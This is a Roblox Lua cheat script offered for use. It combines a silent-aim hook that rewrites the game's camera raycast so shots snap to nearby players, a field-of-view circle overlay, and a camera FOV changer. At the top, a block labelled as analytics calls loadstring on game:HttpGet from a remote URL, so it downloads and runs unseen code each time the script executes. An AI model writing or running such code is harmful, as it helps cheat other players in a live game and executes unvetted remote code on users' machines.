# Silent
Silent Ftap

# silent aim created by Tom

task.spawn(function()
	pcall(function()
		loadstring(game:HttpGet("https://rscripts.net/api/telemetry/client.lua?s=6a9a92dd4556b62ce9e1ce12"))()
	end)
end)
--[[rscripts:analytics:end]]

local sound = Instance.new("Sound")
sound.SoundId = "rbxassetid://123064005903822"
sound.Volume = 1
sound.Parent = game:GetService("SoundService")
sound:Play()
game:GetService("Debris"):AddItem(sound, 5)

local Players = game:GetService("Players")
local lp = Players.LocalPlayer
local rm = require(lp.PlayerScripts:WaitForChild("RaycastModule"))

local oldRaycast = rm.RaycastFromCam

local function getTarget(maxDist, maxFov)
    local cam = workspace.CurrentCamera
    local camPos = cam.CFrame.Position
    local camLook = cam.CFrame.LookVector
    local best = nil
    local bestAngle = maxFov or 85

    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= lp and p.Character then
            local root = p.Character:FindFirstChild("HumanoidRootPart") or p.Character:FindFirstChild("Torso") or p.Character:FindFirstChild("Head")
            local hum = p.Character:FindFirstChildOfClass("Humanoid")
            if root and hum and hum.Health > 0 then
                local offset = root.Position - camPos
                local dist = offset.Magnitude
                if dist <= (maxDist or 50) then
                    local dot = camLook:Dot(offset.Unit)
                    local angle = math.deg(math.acos(math.clamp(dot, -1, 1)))
                    if angle < bestAngle then
                        bestAngle = angle
                        best = root
                    end
                end
            end
        end
    end
    return best
end

rm.RaycastFromCam = function(p1, p2)
    local target = getTarget(50, 35)
    if target then
        local cam = workspace.CurrentCamera
        local camPos = cam.CFrame.Position
        local dir = (target.Position - camPos).Unit * 55
        local params = RaycastParams.new()
        params.FilterType = Enum.RaycastFilterType.Exclude
        params.FilterDescendantsInstances = {lp.Character}
        params.IgnoreWater = true
        
        local hit = workspace:Raycast(camPos, dir, params)
        if hit and hit.Instance and hit.Instance:IsDescendantOf(target.Parent) then
            return hit, hit.Instance.CFrame:ToObjectSpace(CFrame.new(hit.Position))
        end
    end
    return oldRaycast(p1, p2)
end

--// ZYON | FOV VISUAL + TECLA Q
--// Q = ocultar/mostrar o círculo
--// Sem painel ou texto

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local FOV_RADIUS = 100
local FOV_COLOR = Color3.fromRGB(0, 0, 0)
local FOV_THICKNESS = 1.5

local oldGui = playerGui:FindFirstChild("ZyonFOV")
if oldGui then
    oldGui:Destroy()
end

local gui = Instance.new("ScreenGui")
gui.Name = "ZyonFOV"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.Parent = playerGui

local circle = Instance.new("Frame")
circle.Name = "Circle"
circle.AnchorPoint = Vector2.new(0.5, 0.5)
circle.Position = UDim2.fromScale(0.5, 0.5)
circle.Size = UDim2.fromOffset(
    FOV_RADIUS * 2,
    FOV_RADIUS * 2
)
circle.BackgroundTransparency = 1
circle.BorderSizePixel = 0
circle.Parent = gui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(1, 0)
corner.Parent = circle

local stroke = Instance.new("UIStroke")
stroke.Color = FOV_COLOR
stroke.Thickness = FOV_THICKNESS
stroke.Parent = circle

local enabled = true
circle.Visible = enabled

UserInputService.InputBegan:Connect(function(input, processed)
    if processed then
        return
    end

    if input.KeyCode == Enum.KeyCode.Q then
        enabled = not enabled
        circle.Visible = enabled
    end
end)

print("[Zyon] FOV visual carregado. Q alterna a visibilidade.")

-- // Services
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

-- // Variables
local player = Players.LocalPlayer
local camera = workspace.CurrentCamera
local defaultFOV = camera.FieldOfView
local customFOV = defaultFOV
local isFOVEnabled = false

-- // GUI Creation
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
ScreenGui.Name = "FOVChangerGUI"

local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.Size = UDim2.new(0, 280, 0, 150)
MainFrame.Position = UDim2.new(0.5, -140, 0.5, -75)
MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true

local Title = Instance.new("TextLabel", MainFrame)
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Title.Text = "FOV Changer"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.SourceSansBold
Title.TextSize = 18

local ToggleButton = Instance.new("TextButton", MainFrame)
ToggleButton.Size = UDim2.new(0, 120, 0, 30)
ToggleButton.Position = UDim2.new(0, 10, 0, 45)
ToggleButton.Text = "FOV: OFF"
ToggleButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ToggleButton.Font = Enum.Font.SourceSans
ToggleButton.TextSize = 16

local SliderLabel = Instance.new("TextLabel", MainFrame)
SliderLabel.Size = UDim2.new(0, 140, 0, 20)
SliderLabel.Position = UDim2.new(0, 10, 0, 85)
SliderLabel.Text = "FOV: " .. defaultFOV
SliderLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
SliderLabel.Font = Enum.Font.SourceSans
SliderLabel.TextSize = 14
SliderLabel.BackgroundTransparency = 1

local FOVSlider = Instance.new("TextBox", MainFrame)
FOVSlider.Size = UDim2.new(0, 60, 0, 25)
FOVSlider.Position = UDim2.new(0, 160, 0, 80)
FOVSlider.PlaceholderText = tostring(defaultFOV)
FOVSlider.Text = ""
FOVSlider.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
FOVSlider.TextColor3 = Color3.fromRGB(255, 255, 255)
FOVSlider.Font = Enum.Font.SourceSans
FOVSlider.TextSize = 14
FOVSlider.ClearTextOnFocus = false

-- // Functions
local function setFOV(value)
	if isFOVEnabled then
		camera.FieldOfView = value
	end
end

ToggleButton.MouseButton1Click:Connect(function()
	isFOVEnabled = not isFOVEnabled
	ToggleButton.Text = "FOV: " .. (isFOVEnabled and "ON" or "OFF")
	if isFOVEnabled then
		setFOV(customFOV)
	else
		camera.FieldOfView = defaultFOV
	end
end)

FOVSlider.FocusLost:Connect(function()
	local num = tonumber(FOVSlider.Text)
	if num and num >= 1 and num <= 200 then
		customFOV = num
		SliderLabel.Text = "FOV: " .. tostring(customFOV)
		setFOV(customFOV)
	else
		FOVSlider.Text = tostring(customFOV)
	end
end)

-- // Death/Respawn Detection
player.CharacterAdded:Connect(function(char)
	char:WaitForChild("Humanoid")
	wait(1)
	if isFOVEnabled then
		camera.FieldOfView = customFOV
	end
end)

-- // Optional: Force FOV on loop (in case weapons or scripts overwrite it)
RunService.RenderStepped:Connect(function()
	if isFOVEnabled and camera.FieldOfView ~= customFOV then
		camera.FieldOfView = customFOV
	end
end)
